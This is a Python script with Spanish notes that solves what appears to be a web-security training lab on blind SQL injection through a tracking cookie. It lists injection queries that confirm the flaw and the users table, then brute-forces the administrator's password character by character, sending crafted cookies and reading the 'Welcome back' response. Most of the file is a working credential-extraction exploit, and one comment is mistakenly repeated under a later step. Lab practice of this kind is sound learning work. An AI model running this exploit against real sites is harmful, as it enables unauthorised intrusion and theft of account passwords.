"""
Blind SQL injection with conditional responses

Parametro vulnerable: tracking cookie

Objetivos:
    1) Obtener el password de administrator
    2) Ingresar a la aplicacion como el usuario administrator

Analisis:

1) Confirmar que el parametro es vulnerable a blind SQL Injection

SELECT tracking-id FROM tracking-table WHERE tracking-id = '<value>'
    si el tracking-id existe -> consulta devuelve el valor "Welcome back"
    si el tracking-id no existe -> no hay valor
    
SELECT tracking-id FROM tracking-table WHERE tracking-id = '<value>' AND 1=1 --' -> TRUE -> Welcome back message
SELECT tracking-id FROM tracking-table WHERE tracking-id = '<value>' AND 1=0 --' -> FALSE -> NO Welcome back message

2) Confirmar que existe una tabla users
SELECT tracking-id FROM tracking-table WHERE tracking-id = '<value>' AND (SELECT 'x' FROM users LIMIT 1) = 'x' --'

3) Confirmar que el usuario administrator existe en la tabla users
SELECT tracking-id FROM tracking-table WHERE tracking-id = '<value>' AND (SELECT username FROM users WHERE username='administrator') = 'administrator' --'
-> si esta consulta es verdadera entonces el usuario administrator existe

4) Enumerar el password de usuario administrator
SELECT tracking-id FROM tracking-table WHERE tracking-id = '<value>' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1) = 'administrator' --'
-> esta consulta nos permite determinar que la longitud del password es de 20 caracteres

5) Ataque de fuerza bruta probando caracter por caracter
SELECT tracking-id FROM tracking-table WHERE tracking-id = '<value>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator' AND LENGTH(password)>1) = 'a' --'
-> esta consulta nos permite determinar que la longitud del password es de 20 caracteres

"""

import requests
import sys
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range (1,21):
        for j in range(32,126):
            sqli_payload = "' AND (SELECT ASCII(SUBSTRING(password,{0},1)) FROM users WHERE username='administrator' AND LENGTH(password)>1) = '{1}' --".format(i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'uAEm989YeftAEvpD'+ sqli_payload_encoded, 'session':'H4a0iuyOTRFjIK6bvCzyfDtn6MWJiEOL'}
            r = requests.get(url, cookies=cookies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            


def obtener_cookies(url):
    cookies = requests.get(url).cookies
    print(cookies)    
    
def main():
    url = "https://0a52009604e23b9284049386005c00d5.web-security-academy.net/"
    obtener_cookies(url)
    sqli_password(url)

if __name__ == "__main__":
    main()